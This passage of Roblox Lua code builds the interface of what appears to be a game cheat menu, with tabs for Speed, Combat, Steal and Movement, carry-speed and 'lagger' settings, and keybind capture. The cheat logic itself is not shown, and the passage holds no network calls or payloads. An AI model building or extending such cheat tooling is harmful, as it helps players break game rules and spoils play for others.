		frame11.Position = UDim2.new(0, 148, 0, 72)
		frame11.Size = UDim2.new(0, 1, 1, -84)
		frame11.BackgroundColor3 = fn3()
		frame11.BackgroundTransparency = 0.55
		frame11.BorderSizePixel = 0
		frame11.Parent = frame3
		frame11.ZIndex = 2
		frame = Instance.new("Frame")
		frame.Name = "TabBar"
		frame.Size = UDim2.new(0, 136, 1, -84)
		frame.Position = UDim2.new(0, 8, 0, 72)
		frame.BackgroundTransparency = 1
		frame.BorderSizePixel = 0
		frame.Parent = frame3
		frame.ZIndex = 2
		local frame12 = Instance.new("Frame")
		frame12.Name = "CategoryList"
		frame12.Size = UDim2.new(1, 0, 1, 0)
		frame12.BackgroundTransparency = 1
		frame12.BorderSizePixel = 0
		frame12.Parent = frame
		GuiRefs.categoryList = frame12
		local uiListLayout = Instance.new("UIListLayout")
		uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
		uiListLayout.Padding = UDim.new(0, 6)
		uiListLayout.Parent = frame12
		local uiPadding = Instance.new("UIPadding")
		uiPadding.PaddingTop = UDim.new(0, 4)
		uiPadding.PaddingLeft = UDim.new(0, 2)
		uiPadding.PaddingRight = UDim.new(0, 2)
		uiPadding.Parent = frame12
		local scrollingFrame = Instance.new("ScrollingFrame")
		scrollingFrame.Name = "ContentFrame"
		scrollingFrame.Size = UDim2.new(1, -164, 1, -84)
		scrollingFrame.Position = UDim2.new(0, 156, 0, 72)
		scrollingFrame.BackgroundTransparency = 1
		scrollingFrame.BorderSizePixel = 0
		scrollingFrame.ScrollBarThickness = 8
		scrollingFrame.ScrollBarImageColor3 = tbl30.blue
		scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 800)
		scrollingFrame.AutomaticCanvasSize = Enum.AutomaticSize.None
		scrollingFrame.ScrollingDirection = Enum.ScrollingDirection.Y
		scrollingFrame.ScrollingEnabled = true
		scrollingFrame.Active = true
		scrollingFrame.ElasticBehavior = Enum.ElasticBehavior.Never
		scrollingFrame.Parent = frame3
		GuiRefs.contentFrame = scrollingFrame
		local flag44 = false

		local function fn27()
			flag44 = false
			local n21 = math.max(0, scrollingFrame.AbsoluteCanvasSize.Y - scrollingFrame.AbsoluteSize.Y)
			local n22 = math.clamp(scrollingFrame.CanvasPosition.Y, 0, n21)

			pcall(function()
				scrollingFrame.ScrollVelocity = Vector2.new(0, 0)
			end)

			scrollingFrame.CanvasPosition = Vector2.new(0, n22)

			task.spawn(function()
				for i = 1, 6 do
					pcall(function()
						scrollingFrame.ScrollVelocity = Vector2.new(0, 0)
					end)

					scrollingFrame.CanvasPosition = Vector2.new(0, math.clamp(scrollingFrame.CanvasPosition.Y, 0, n21))
					task.wait()
				end
			end)
		end

		scrollingFrame.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 then
				flag44 = true
			end
		end)

		scrollingFrame.InputEnded:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 then
				fn27()
			end
		end)

		UserInputService.InputEnded:Connect(function(input)
			if not flag44 then
				return
			end

			if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 then
				fn27()
			end
		end)

		RunService.RenderStepped:Connect(function()
			if not flag44 then
				pcall(function()
					if scrollingFrame.ScrollVelocity.Magnitude > 0.01 then
						scrollingFrame.ScrollVelocity = Vector2.new(0, 0)
					end
				end)
			end
		end)

		local uiListLayout2 = Instance.new("UIListLayout")
		uiListLayout2.SortOrder = Enum.SortOrder.LayoutOrder
		uiListLayout2.Padding = UDim.new(0, 6)
		uiListLayout2.Parent = scrollingFrame

		local function refreshCanvas()
			task.defer(function()
				local n21 = 0

				for _, child in ipairs(scrollingFrame:GetChildren()) do
					if child:IsA("GuiObject") and child.Visible and child.Name ~= "UIListLayout" then
						if not (child:IsA("UIListLayout") or child:IsA("UIPadding") or child:IsA("UIStroke")) then
							local uiListLayout3 = child:FindFirstChildOfClass("UIListLayout")
							local n22 = 0

							if uiListLayout3 then
								n22 = uiListLayout3.AbsoluteContentSize.Y
							end

							local n23 = 0

							for _, child2 in ipairs(child:GetChildren()) do
								if child2:IsA("GuiObject") and child2.Visible then
									local y = child2.AbsoluteSize.Y

									if y < 1 then
										y = 40
									end

									n23 = n23 + y + 6
								end
							end

							if not (n22 < n23) then
								n23 = n22
							end

							if child.AbsoluteSize.Y > n23 then
								n23 = child.AbsoluteSize.Y
							end

							if n23 > n21 then
								n21 = n23
							end
						end
					end
				end

				if n21 < 1 then
					n21 = uiListLayout2.AbsoluteContentSize.Y
				end

				local n22 = math.max(n21 + 220, scrollingFrame.AbsoluteSize.Y + 40)
				scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, n22)
			end)
		end

		uiListLayout2:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
			task.defer(refreshCanvas)
		end)

		scrollingFrame:GetPropertyChangedSignal("AbsoluteSize"):Connect(function()
			task.defer(refreshCanvas)
		end)

		task.spawn(function()
			for i = 1, 12 do
				task.wait(0.12)
				refreshCanvas()
			end
		end)

		local uiPadding2 = Instance.new("UIPadding")
		uiPadding2.PaddingLeft = UDim.new(0, 6)
		uiPadding2.PaddingRight = UDim.new(0, 6)
		uiPadding2.PaddingTop = UDim.new(0, 6)
		uiPadding2.PaddingBottom = UDim.new(0, 40)
		uiPadding2.Parent = scrollingFrame
		GuiRefs.refreshCanvas = refreshCanvas
	end

	fn25()
	local tbl33 = { cb = nil, label = nil, active = false }

	local tbl34 = {
		ButtonA = "A",
		ButtonB = "B",
		ButtonX = "X",
		ButtonY = "Y",
		ButtonR1 = "RB",
		ButtonR2 = "RT",
		ButtonL1 = "LB",
		ButtonL2 = "LT",
		DPadUp = "D↑",
		DPadDown = "D↓",
		DPadLeft = "D←",
		DPadRight = "D→",
		ButtonStart = "▶",
		ButtonSelect = "◀",
		LeftShift = "LShift",
		RightShift = "RShift",
		LeftControl = "LCtrl",
		RightControl = "RCtrl",
		LeftAlt = "LAlt",
		RightAlt = "RAlt",
		LeftSuper = "LSuper",
		RightSuper = "RSuper",
		Return = "Enter",
		BackSpace = "Backspace",
		Tab = "Tab",
		CapsLock = "CapsLock",
		Escape = "Esc",
		Space = "Space",
		PageUp = "PgUp",
		PageDown = "PgDn",
		End = "End",
		Home = "Home",
		Insert = "Ins",
		Delete = "Del",
		Up = "↑",
		Down = "↓",
		Left = "←",
		Right = "→",
		F1 = "F1",
		F2 = "F2",
		F3 = "F3",
		F4 = "F4",
		F5 = "F5",
		F6 = "F6",
		F7 = "F7",
		F8 = "F8",
		F9 = "F9",
		F10 = "F10",
		F11 = "F11",
		F12 = "F12",
		Minus = "-",
		Equals = "=",
		LeftBracket = "[",
		RightBracket = "]",
		BackSlash = "\\",
		Semicolon = ";",
		Quote = "'",
		Comma = ",",
		Period = ".",
		Slash = "/",
		Backquote = "`",
		ButtonA = "A (Pad)",
		ButtonB = "B (Pad)",
		ButtonX = "X (Pad)",
		ButtonY = "Y (Pad)",
		ButtonL1 = "L1",
		ButtonR1 = "R1",
		ButtonL2 = "L2",
		ButtonR2 = "R2",
		ButtonL3 = "L3",
		ButtonR3 = "R3",
		ButtonStart = "Start",
		ButtonSelect = "Select",
		DPadUp = "DPad ↑",
		DPadDown = "DPad ↓",
		DPadLeft = "DPad ←",
		DPadRight = "DPad →",
		Thumbstick1 = "L Stick",
		Thumbstick2 = "R Stick",
	}

	prettyKey = function(arg)
		if not arg then
			return "?"
		end
		local name = typeof(arg) == "EnumItem" and arg.Name or tostring(arg)
		return tbl34[name] or name
	end

	cancelKL = function()
		if tbl33.label then
			tbl33.label.BackgroundColor3 = tbl30.blue
			tbl33.label.BackgroundTransparency = 0.5
		end

		tbl33.cb = nil
		tbl33.label = nil
		tbl33.active = false
	end

	startKL = function(label, cb)
		cancelKL()
		tbl33.cb = cb
		tbl33.label = label
		tbl33.active = true
		label.Text = "..."
		label.BackgroundColor3 = Color3.fromRGB(80, 220, 120)
		label.BackgroundTransparency = 0.3
		local v5 = label

		task.delay(10, function()
			if tbl33.label == v5 and tbl33.active then
				cancelKL()

				if label and label.Parent then
					label.BackgroundColor3 = tbl30.blue
					label.BackgroundTransparency = 0.5
				end
			end
		end)
	end

	UserInputService.InputBegan:Connect(function(input)
		if not tbl33.active then
			return
		end
		local userInputType = input.UserInputType
		if userInputType ~= Enum.UserInputType.Keyboard and not (userInputType == Enum.UserInputType.Gamepad1 or userInputType == Enum.UserInputType.Gamepad2 or userInputType == Enum.UserInputType.Gamepad3 or userInputType == Enum.UserInputType.Gamepad4) then
			return
		end
		local keyCode = input.KeyCode
		if keyCode == Enum.KeyCode.Unknown then
			return
		end

		if keyCode == Enum.KeyCode.Thumbstick1 or keyCode == Enum.KeyCode.Thumbstick2 then
			return
		end

		if keyCode == Enum.KeyCode.Escape then
			cancelKL()
			return
		end
		local cb = tbl33.cb
		local label = tbl33.label
		cancelKL()

		if label and label.Parent then
			label.Text = prettyKey(keyCode)
			label.BackgroundColor3 = tbl30.blue
			label.BackgroundTransparency = 0.5
		end

		if cb then
			task.spawn(cb, keyCode)
		end
	end)

	addSectLbl = function(arg, text3, layoutOrder)
		local frame2 = Instance.new("Frame", arg)
		frame2.Size = UDim2.new(1, 0, 0, 24)
		frame2.BackgroundTransparency = 1
		frame2.BorderSizePixel = 0
		frame2.LayoutOrder = layoutOrder
		local textLabel = Instance.new("TextLabel", frame2)
		textLabel.Size = UDim2.new(1, 0, 1, 0)
		textLabel.BackgroundTransparency = 1
		textLabel.BorderSizePixel = 0
		textLabel.Text = text3
		textLabel.TextColor3 = tbl30.textMuted
		textLabel.TextSize = 11
		textLabel.Font = Enum.Font.GothamBold
		textLabel.TextXAlignment = Enum.TextXAlignment.Left
		textLabel.Position = UDim2.new(0, 12, 0, 0)
		textLabel.Size = UDim2.new(1, -12, 1, 0)
		local frame3 = Instance.new("Frame", frame2)
		frame3.AnchorPoint = Vector2.new(0, 0.5)
		frame3.Position = UDim2.new(0, 2, 0.5, 1)
		frame3.Size = UDim2.new(0, 3, 0, 3)
		frame3.BackgroundColor3 = fn3()
		frame3.BorderSizePixel = 0
		guiCorner(frame3, 2)
		return textLabel
	end

	addInputRow = function(arg, text3, arg2, layoutOrder, arg3)
		local frame2 = Instance.new("Frame", arg)
		frame2.Size = UDim2.new(1, 0, 0, 40)
		frame2.BackgroundColor3 = tbl30.row
		frame2.BackgroundTransparency = 0.1
		frame2.BorderSizePixel = 0
		frame2.LayoutOrder = layoutOrder
		frame2.ClipsDescendants = true
		guiCorner(frame2, 12)
		local v5 = guiStroke(frame2, tbl30.divider, 1)
		v5.Transparency = 0.45
		local textLabel = Instance.new("TextLabel", frame2)
		textLabel.Size = UDim2.new(0.65, 0, 1, 0)
		textLabel.Position = UDim2.new(0, 12, 0, 0)
		textLabel.BackgroundTransparency = 1
		textLabel.Text = text3
		textLabel.TextColor3 = tbl30.text
		textLabel.TextSize = 12.5
		textLabel.Font = Enum.Font.GothamBold
		textLabel.TextXAlignment = Enum.TextXAlignment.Left
		local frame3 = Instance.new("Frame", frame2)
		frame3.ZIndex = 6
		frame3.Position = UDim2.new(1, -62, 0.5, -12)
		frame3.Size = UDim2.new(0, 54, 0, 24)
		frame3.BackgroundColor3 = tbl30.input
		frame3.BackgroundTransparency = 0.15
		frame3.BorderSizePixel = 0
		guiCorner(frame3, 6)
		guiStroke(frame3, Color3.fromRGB(55, 55, 60), 1)
		local textBox = Instance.new("TextBox", frame3)
		textBox.ZIndex = 7
		textBox.Size = UDim2.new(1, 0, 1, 0)
		textBox.BackgroundTransparency = 1
		textBox.Text = tostring(arg2)
		textBox.TextColor3 = tbl30.text
		textBox.TextSize = 12
		textBox.Font = Enum.Font.GothamBold
		textBox.ClearTextOnFocus = false

		textBox.FocusLost:Connect(function()
			local num = tonumber(textBox.Text)

			if num and num > 0 then
				arg3(num)
			else
				textBox.Text = tostring(arg2)
			end
		end)

		local textButton = Instance.new("TextButton", frame2)
		textButton.Size = UDim2.new(1, 0, 1, 0)
		textButton.BackgroundTransparency = 1
		textButton.Text = ""
		textButton.ZIndex = 0

		textButton.MouseEnter:Connect(function()
			tw(frame2, { BackgroundTransparency = 0.02 }, TweenInfo.new(0.18))
			tw(v5, { Transparency = 0.15, Color = fn3() }, TweenInfo.new(0.18))
		end)

		textButton.MouseLeave:Connect(function()
			tw(frame2, { BackgroundTransparency = 0.1 }, TweenInfo.new(0.18))
			tw(v5, { Transparency = 0.45, Color = tbl30.divider }, TweenInfo.new(0.18))
		end)

		return frame2, textBox
	end

	addToggleRow = function(arg, text3, arg2, layoutOrder, arg3, arg4)
		local flag41 = arg3 ~= nil
		local frame2 = Instance.new("Frame", arg)
		frame2.Size = UDim2.new(1, 0, 0, flag41 and 54 or 40)
		frame2.BackgroundColor3 = tbl30.row
		frame2.BackgroundTransparency = 0.1
		frame2.BorderSizePixel = 0
		frame2.LayoutOrder = layoutOrder
		frame2.ClipsDescendants = true
		guiCorner(frame2, 12)
		local v5 = guiStroke(frame2, tbl30.divider, 1)
		v5.Transparency = 0.45
		local textLabel = Instance.new("TextLabel", frame2)

		if flag41 then
			textLabel.Size = UDim2.new(0.65, 0, 0, 18)
			textLabel.Position = UDim2.new(0, 12, 0, 7)
		else
			textLabel.Size = UDim2.new(0.65, 0, 1, 0)
			textLabel.Position = UDim2.new(0, 12, 0, 0)
		end

		textLabel.BackgroundTransparency = 1
		textLabel.Text = text3
		textLabel.TextColor3 = tbl30.text
		textLabel.TextSize = 12.5
		textLabel.Font = Enum.Font.GothamBold
		textLabel.TextXAlignment = Enum.TextXAlignment.Left

		if flag41 then
			if not tbl32[arg3] then
				tbl32[arg3] = Enum.KeyCode.Unknown
			end

			local textButton = Instance.new("TextButton", frame2)
			textButton.Size = UDim2.new(0, 56, 0, 18)
			textButton.Position = UDim2.new(0, 12, 1, -24)
			textButton.BackgroundColor3 = tbl30.blue
			textButton.BackgroundTransparency = 0.5
			textButton.BorderSizePixel = 0
			textButton.Text = tbl32[arg3] == Enum.KeyCode.Unknown and "SET" or prettyKey(tbl32[arg3])
			textButton.TextColor3 = tbl30.white
			textButton.TextSize = 10
			textButton.Font = Enum.Font.GothamBold
			guiCorner(textButton, 5)

			textButton.MouseButton1Click:Connect(function()
				startKL(textButton, function(arg5)
					tbl32[arg3] = arg5
					_GuiKeys = tbl32
					textButton.Text = prettyKey(arg5)
					saveConfig()
				end)
			end)
		end

		local frame3 = Instance.new("Frame", frame2)
		frame3.Size = UDim2.new(0, 42, 0, 22)
		frame3.Position = UDim2.new(1, -52, 0.5, -11)
		frame3.BackgroundColor3 = arg2 and FX.dark(fn3(), 0.3) or tbl30.input
		frame3.BackgroundTransparency = 0.1
		frame3.BorderSizePixel = 0
		frame3.ZIndex = 2
		guiCorner(frame3, 11)
		local v6 = guiStroke(frame3, arg2 and fn3() or tbl30.divider, 1)
		v6.Transparency = arg2 and 0.2 or 0.55
		local v7 = FX.glow(frame3, { spread = 7, transparency = arg2 and 0.72 or 1, zindex = 1 })
		local frame4 = Instance.new("Frame", frame3)
		frame4.Size = UDim2.new(0, 16, 0, 16)
		frame4.Position = arg2 and UDim2.new(1, -18, 0.5, -8) or UDim2.new(0, 2, 0.5, -8)
		frame4.BackgroundColor3 = arg2 and fn3() or Color3.fromRGB(118, 130, 124)
		frame4.BackgroundTransparency = 0
		frame4.BorderSizePixel = 0
		frame4.ZIndex = 3
		guiCorner(frame4, 8)
		local flag42 = arg2

		PULSE.add(function(arg5)
			if not frame3.Parent then
				return false
			end

			if flag42 then
				local v8 = fn3()
				v6.Transparency = 0.3 - 0.26 * arg5
				v6.Color = v8
				v7.ImageTransparency = 0.84 - 0.2 * arg5
				frame4.BackgroundColor3 = PULSE.mix(v8, Color3.fromRGB(255, 255, 255), 0.1 * arg5)
			else
				v6.Transparency = 0.62 - 0.1 * arg5
				v7.ImageTransparency = 1
			end
		end)

		local uiScale = Instance.new("UIScale")
		uiScale.Scale = 1
		uiScale.Parent = frame2

		local function fn26(arg5)
			flag42 = arg5
			local v8 = fn3()

			TweenService:Create(frame4, TweenInfo.new(0.26, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
				Position = arg5 and UDim2.new(1, -18, 0.5, -8) or UDim2.new(0, 2, 0.5, -8),
				BackgroundColor3 = arg5 and v8 or Color3.fromRGB(118, 130, 124),
			}):Play()

			TweenService:Create(frame3, TweenInfo.new(0.22, Enum.EasingStyle.Quad), { BackgroundColor3 = arg5 and FX.dark(v8, 0.3) or tbl30.input }):Play()
			TweenService:Create(v6, TweenInfo.new(0.22), { Transparency = arg5 and 0.2 or 0.55, Color = arg5 and v8 or tbl30.divider }):Play()
			TweenService:Create(v7, TweenInfo.new(0.25), { ImageTransparency = arg5 and 0.72 or 1 }):Play()
			TweenService:Create(frame2, TweenInfo.new(0.1), { BackgroundTransparency = 0 }):Play()

			task.delay(0.12, function()
				TweenService:Create(frame2, TweenInfo.new(0.22), { BackgroundTransparency = 0.1 }):Play()
			end)
		end

		local textButton = Instance.new("TextButton", frame2)
		textButton.Size = UDim2.new(0, 42, 0, 22)
		textButton.Position = UDim2.new(1, -52, 0.5, -11)
		textButton.BackgroundTransparency = 1
		textButton.Text = ""
		textButton.ZIndex = 4

		textButton.MouseButton1Click:Connect(function()
			flag42 = not flag42
			fn26(flag42)
			TweenService:Create(uiScale, TweenInfo.new(0.08), { Scale = 0.97 }):Play()

			task.delay(0.08, function()
				TweenService:Create(uiScale, TweenInfo.new(0.16, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Scale = 1 }):Play()
			end)

			if arg4 then
				arg4(flag42)
			end
		end)

		local textButton2 = Instance.new("TextButton", frame2)
		textButton2.Size = UDim2.new(1, 0, 1, 0)
		textButton2.BackgroundTransparency = 1
		textButton2.Text = ""
		textButton2.ZIndex = 0

		textButton2.MouseEnter:Connect(function()
			tw(frame2, { BackgroundTransparency = 0.02 }, TweenInfo.new(0.18))
			tw(v5, { Transparency = 0.15, Color = fn3() }, TweenInfo.new(0.18))
		end)

		textButton2.MouseLeave:Connect(function()
			tw(frame2, { BackgroundTransparency = 0.1 }, TweenInfo.new(0.18))
			tw(v5, { Transparency = 0.45, Color = tbl30.divider }, TweenInfo.new(0.18))
		end)

		if arg3 then
			tbl31[arg3] = fn26
		end

		return frame2, fn26
	end

	addActionRow = function(arg, text3, arg2, arg3, layoutOrder)
		local frame2 = Instance.new("Frame", arg)
		frame2.Size = UDim2.new(1, 0, 0, 42)
		frame2.BackgroundColor3 = tbl30.row
		frame2.BackgroundTransparency = 0.1
		frame2.BorderSizePixel = 0
		frame2.LayoutOrder = layoutOrder
		frame2.ClipsDescendants = true
		guiCorner(frame2, 12)
		local v5 = guiStroke(frame2, tbl30.divider, 1)
		v5.Transparency = 0.45
		local textLabel = Instance.new("TextLabel", frame2)
		textLabel.Size = UDim2.new(0.65, 0, 1, 0)
		textLabel.Position = UDim2.new(0, 12, 0, 0)
		textLabel.BackgroundTransparency = 1
		textLabel.Text = text3
		textLabel.TextColor3 = tbl30.text
		textLabel.TextSize = 12.5
		textLabel.Font = Enum.Font.GothamBold
		textLabel.TextXAlignment = Enum.TextXAlignment.Left

		if arg2 then
			if not tbl32[arg2] then
				tbl32[arg2] = Enum.KeyCode.Unknown
			end

			local textButton = Instance.new("TextButton", frame2)
			textButton.Size = UDim2.new(0, 60, 0, 24)
			textButton.Position = UDim2.new(1, -68, 0.5, -12)
			textButton.BackgroundColor3 = tbl30.blue
			textButton.BackgroundTransparency = 0.5
			textButton.BorderSizePixel = 0
			textButton.Text = tbl32[arg2] == Enum.KeyCode.Unknown and "SET" or prettyKey(tbl32[arg2])
			textButton.TextColor3 = tbl30.white
			textButton.TextSize = 10
			textButton.Font = Enum.Font.GothamBold
			guiCorner(textButton, 5)

			textButton.MouseButton1Click:Connect(function()
				startKL(textButton, function(arg4)
					tbl32[arg2] = arg4
					_GuiKeys = tbl32
					textButton.Text = prettyKey(arg4)
					saveConfig()
				end)
			end)
		end

		local uiScale = Instance.new("UIScale")
		uiScale.Scale = 1
		uiScale.Parent = frame2
		local textButton = Instance.new("TextButton", frame2)
		textButton.Size = UDim2.new(0.65, 0, 1, 0)
		textButton.BackgroundTransparency = 1
		textButton.Text = ""

		textButton.MouseButton1Click:Connect(function()
			TweenService:Create(uiScale, TweenInfo.new(0.08), { Scale = 0.96 }):Play()
			TweenService:Create(frame2, TweenInfo.new(0.1), { BackgroundTransparency = 0.2 }):Play()

			task.delay(0.08, function()
				TweenService:Create(uiScale, TweenInfo.new(0.16, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Scale = 1 }):Play()
				TweenService:Create(frame2, TweenInfo.new(0.18), { BackgroundTransparency = 0.1 }):Play()
			end)

			if arg3 then
				arg3()
			end
		end)

		local textButton2 = Instance.new("TextButton", frame2)
		textButton2.Size = UDim2.new(1, 0, 1, 0)
		textButton2.BackgroundTransparency = 1
		textButton2.Text = ""
		textButton2.ZIndex = 0

		textButton2.MouseEnter:Connect(function()
			tw(frame2, { BackgroundTransparency = 0.02 }, TweenInfo.new(0.18))
			tw(v5, { Transparency = 0.15, Color = fn3() }, TweenInfo.new(0.18))
		end)

		textButton2.MouseLeave:Connect(function()
			tw(frame2, { BackgroundTransparency = 0.1 }, TweenInfo.new(0.18))
			tw(v5, { Transparency = 0.45, Color = tbl30.divider }, TweenInfo.new(0.18))
		end)

		return frame2
	end

	local tbl35 = { "Speed", "Combat", "Steal", "Movement", "Visual", "Keybinds", "Background" }
	local tbl36 = { contents = {}, btnsSide = {}, active = "Speed" }

	local function fn26()
		for _, v5 in pairs(tbl35) do
			local frame2 = Instance.new("Frame")
			frame2.Size = UDim2.new(1, 0, 0, 0)
			frame2.AutomaticSize = Enum.AutomaticSize.Y
			frame2.BackgroundTransparency = 1
			frame2.Visible = v5 == "Speed"
			frame2.Parent = GuiRefs.contentFrame
			tbl36.contents[v5] = frame2
			local uiListLayout = Instance.new("UIListLayout")
			uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
			uiListLayout.Padding = UDim.new(0, 6)
			uiListLayout.Parent = frame2

			uiListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
				if frame2.Visible and GuiRefs.refreshCanvas then
					GuiRefs.refreshCanvas()
				end
			end)
		end

		local tbl37 = {
			Speed = { x = 0, y = 0, w = 1, h = 0, special = false },
			Combat = { x = 0, y = 0, w = 1, h = 0, special = false },
			Steal = { x = 0, y = 0, w = 1, h = 0, special = false },
			Movement = { x = 0, y = 0, w = 1, h = 0, special = false },
			Visual = { x = 0, y = 0, w = 1, h = 0, special = false },
			Keybinds = { x = 0, y = 0, w = 1, h = 0, special = false },
			Background = { x = 0, y = 0, w = 1, h = 0, special = false },
		}

		local frame2 = Instance.new("Frame")
		frame2.Name = "TabHighlight"
		frame2.BackgroundColor3 = tbl30 and tbl30.blue or Color3.fromRGB(0, 255, 120)
		frame2.BackgroundTransparency = 0.82
		frame2.BorderSizePixel = 0
		frame2.ZIndex = 1
		frame2.Parent = GuiRefs.categoryList
		guiCorner(frame2, 8)
		local uiStroke = Instance.new("UIStroke", frame2)
		uiStroke.Color = fn3()
		uiStroke.Thickness = 1.6
		uiStroke.Transparency = 0.35
		local tweenInfo = TweenInfo.new(0.28, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

		local function moveTabHL(arg)
			if not arg then
				return
			end
			TweenService:Create(frame2, tweenInfo, { Position = arg.Position, Size = arg.Size }):Play()
		end

		tbl36.tabHL = frame2
		tbl36.moveTabHL = moveTabHL

		for i, v5 in ipairs(tbl35) do
			if not tbl37[v5] then
			end

			local textButton = Instance.new("TextButton")
			local flag41 = v5 == "Speed"
			textButton.Size = UDim2.new(1, -4, 0, 38)
			textButton.BackgroundColor3 = flag41 and FX.mix(tbl30.row, fn3(), 0.14) or tbl30.row
			textButton.BackgroundTransparency = flag41 and 0 or 0.22
			textButton.Text = "     " .. v5
			textButton.TextColor3 = flag41 and Color3.fromRGB(255, 255, 255) or tbl30.textDim
			textButton.TextSize = 13
			textButton.Font = Enum.Font.GothamBold
			textButton.AutoButtonColor = false
			textButton.TextXAlignment = Enum.TextXAlignment.Left
			textButton.BorderSizePixel = 0
			textButton.LayoutOrder = i
			textButton.ZIndex = 3
			textButton.Parent = GuiRefs.categoryList
			guiCorner(textButton, 10)
			local v6 = guiStroke(textButton, flag41 and fn3() or tbl30.divider, 1)
			v6.Transparency = flag41 and 0.15 or 0.7
			local frame3 = Instance.new("Frame", textButton)
			frame3.Name = "Indicator"
			frame3.AnchorPoint = Vector2.new(0, 0.5)
			frame3.Position = UDim2.new(0, 8, 0.5, 0)
			frame3.Size = flag41 and UDim2.new(0, 3, 0, 18) or UDim2.new(0, 3, 0, 0)
			frame3.BackgroundColor3 = fn3()
			frame3.BorderSizePixel = 0
			frame3.ZIndex = 4
			guiCorner(frame3, 2)
			local v7 = FX.glow(frame3, { spread = 8, transparency = flag41 and 0.7 or 1, zindex = 3 })
			tbl36.indicators = tbl36.indicators or {}
			tbl36.indicators[v5] = { bar = frame3, glow = v7, stroke = v6 }
			tbl36.btnsSide[v5] = textButton

			textButton.MouseButton1Click:Connect(function()
				if tbl36.active == v5 then
					return
				end

				for _, content in pairs(tbl36.contents) do
					content.Visible = false
				end

				local v8 = tbl36.contents[v5]
				v8.Visible = true
				tbl36.active = v5
				local uiScale = v8:FindFirstChildOfClass("UIScale")

				if not uiScale then
					uiScale = Instance.new("UIScale")
					uiScale.Parent = v8
				end

				uiScale.Scale = 0.96
				TweenService:Create(uiScale, TweenInfo.new(0.2, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Scale = 1 }):Play()
				v8.BackgroundTransparency = 1

				for k, v9 in pairs(tbl36.btnsSide) do
					local flag42 = k == v5
					local indicators = tbl36.indicators and tbl36.indicators[k]

					TweenService:Create(v9, tweenInfo, {
						BackgroundTransparency = flag42 and 0 or 0.22,
						BackgroundColor3 = flag42 and FX.mix(tbl30.row, fn3(), 0.14) or tbl30.row,
						TextColor3 = flag42 and Color3.fromRGB(255, 255, 255) or tbl30.textDim,
					}):Play()

					if indicators then
						TweenService:Create(indicators.bar, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Size = flag42 and UDim2.new(0, 3, 0, 18) or UDim2.new(0, 3, 0, 0) }):Play()
						TweenService:Create(indicators.glow, TweenInfo.new(0.28), { ImageTransparency = flag42 and 0.7 or 1 }):Play()
						TweenService:Create(indicators.stroke, TweenInfo.new(0.22), { Transparency = flag42 and 0.15 or 0.7, Color = flag42 and fn3() or tbl30.divider }):Play()
					end
				end

				moveTabHL(textButton)

				task.defer(function()
					if GuiRefs.refreshCanvas then
						GuiRefs.refreshCanvas()
					end

					GuiRefs.contentFrame.CanvasPosition = Vector2.new(0, 0)
				end)
			end)

			textButton.MouseEnter:Connect(function()
				if tbl36.active ~= v5 then
					TweenService:Create(textButton, TweenInfo.new(0.16), {
						BackgroundTransparency = 0.05,
						BackgroundColor3 = FX.mix(tbl30.row, fn3(), 0.07),
						TextColor3 = Color3.fromRGB(230, 238, 234),
					}):Play()

					TweenService:Create(v6, TweenInfo.new(0.16), { Transparency = 0.45 }):Play()
					TweenService:Create(frame3, TweenInfo.new(0.18, Enum.EasingStyle.Quad), { Size = UDim2.new(0, 3, 0, 9) }):Play()
				end
			end)

			textButton.MouseLeave:Connect(function()
				if tbl36.active ~= v5 then
					local tbl38 = { BackgroundTransparency = 0.22, BackgroundColor3 = tbl30.row, TextColor3 = tbl30.textDim }
					TweenService:Create(textButton, TweenInfo.new(0.16), tbl38):Play()
					TweenService:Create(v6, TweenInfo.new(0.16), { Transparency = 0.7 }):Play()
					TweenService:Create(frame3, TweenInfo.new(0.18, Enum.EasingStyle.Quad), { Size = UDim2.new(0, 3, 0, 0) }):Play()
				end
			end)
		end

		local speed = tbl36.btnsSide.Speed

		if speed then
			speed.TextColor3 = Color3.fromRGB(255, 255, 255)
			speed.BackgroundTransparency = 0
			speed.BackgroundColor3 = FX.mix(tbl30.row, fn3(), 0.14)
			frame2.Visible = false
		end
	end

	fn26()

	local function fn27()
		local speed = tbl36.contents.Speed
		addSectLbl(speed, "AUTO", 0)

		addToggleRow(speed, "Auto Carry Speed", flag27, 1, nil, function(arg)
			flag27 = arg
			flag37 = false
			saveConfig()
		end)

		addSectLbl(speed, "SPEED CONFIGURATION", 2)

		addInputRow(speed, "Normal Speed", n, 3, function(arg)
			n = arg
			saveConfig()
		end)

		addInputRow(speed, "Carry Speed", n2, 4, function(arg)
			n2 = arg
			saveConfig()
		end)

		addSectLbl(speed, "LAGGER MODE", 5)

		addInputRow(speed, "Lagger Normal", n3, 6, function(arg)
			n3 = arg
			saveConfig()
		end)

		addInputRow(speed, "Lagger Carry", n4, 7, function(arg)
			n4 = arg
			saveConfig()
		end)

		addSectLbl(speed, "CONTROLS", 8)

		addToggleRow(speed, "Carry Mode", flag, 9, nil, function(arg)
			flag = arg

			if tbl6.carrySpeed then
				tbl6.carrySpeed(flag)
			end

			if refreshSpeedModeLabel then
				refreshSpeedModeLabel()
			end

			saveConfig()
		end)

		addToggleRow(speed, "Lagger Mode", flag2, 10, nil, function(arg)
			flag2 = arg

			if tbl6.lagger then
				tbl6.lagger(arg)
			end

			if refreshSpeedModeLabel then
				refreshSpeedModeLabel()
			end

			saveConfig()
		end)
	end

	fn27()

	local function fn28()
		local combat = tbl36.contents.Combat
		addSectLbl(combat, "BAT CONTROLS", 0)

